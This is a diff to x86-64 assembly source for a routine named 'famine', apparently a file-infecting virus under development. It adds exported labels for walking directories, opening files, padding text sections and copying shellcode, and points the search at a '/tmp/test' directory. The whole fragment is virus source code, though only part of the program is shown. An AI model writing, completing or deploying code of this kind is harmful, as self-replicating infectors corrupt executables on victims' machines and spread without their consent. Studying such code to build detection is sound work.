@@ -3,10 +3,23 @@
 section .text
 
     global famine
+	global _alloc_find_data_strust
+	global _closeHandleFile
+	global _findNextFile
+	global _openCurrentFile
+	global _padTextSection
+	global _copyShellcode1
+	global _prepareChangeDirectory_prepareExit
+	global _changeDirectory
+	global _verifyDot
+
+
+
     extern FindFirstFileA
     extern FindNextFileA
     extern FindClose
     extern LocalAlloc
+	
 
 ; ------------------------------------------------------ ;
 ; Parameters:
@@ -25,6 +38,11 @@ famine:
     mov r15, rax ; r15 = address table
     xor rax, rax
 
+	lea rcx, [rbx + 0x45]
+	call QWORD [ds:r15 + 80] ; SetCurrentDirectory("/tmp/test")
+
+	xor rcx, rcx
+	mov rdx, rcx
     add rcx, 0x40
     add rdx, 400 ; 16 * 25 = 400 (go 25 dir deep)
     call QWORD [ds:r15] ; Data_storage = LocalAlloc(LPTR, 400)
@@ -40,10 +58,14 @@ _alloc_find_data_strust:
 
     ; Get information about the first file in the directory
 
-    lea rcx, [rbx + 0x45]
+    lea rcx, [rbx + 0x92]
     mov rdx, r14
-    call QWORD [ds:r15 + 64] ; FindFirstFileA(FindData, "*")
+    call QWORD [ds:r15 + 64] ; FindFirstFileA("*", &FindData)
     mov r13, rax ; r13 = hFindFile
+
+	; cmp r13, -1
+	; je _clearAndTerminate
+
     cmp r12, 1
 	jz	_changeDirectory
 	jmp	_openCurrentFile
@@ -320,7 +342,7 @@ _returnError:
 
 _goBackDir:
 	xor 	rcx, rcx
-	lea 	rcx, [ds:rbx + 0xCC]		; rcx: '..'
+	lea 	rcx, [ds:rbx + 0x9A]		; rcx: '..'
 	call 	QWORD [ds:r15 + 80]		; SetCurrentDirectory('..')
 	cmp 	rax, 0
 	jz	_clearAndTerminate
